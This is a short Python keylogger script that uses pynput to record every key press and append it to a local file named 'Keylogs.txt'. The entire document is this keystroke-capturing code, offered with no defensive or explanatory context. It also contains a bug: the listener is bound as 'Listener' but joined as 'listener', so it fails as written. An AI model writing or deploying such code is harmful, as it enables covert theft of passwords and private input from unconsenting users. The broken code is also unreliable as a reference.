from pynput.keyboard import Key, Listener

def on_press(key):
    fp=open("Keylogs.txt","a")
    print(key)
    fp.write(str(key)+"\n")
    fp.close()

with Listener(on_press=on_press) as Listener:
    listener.join()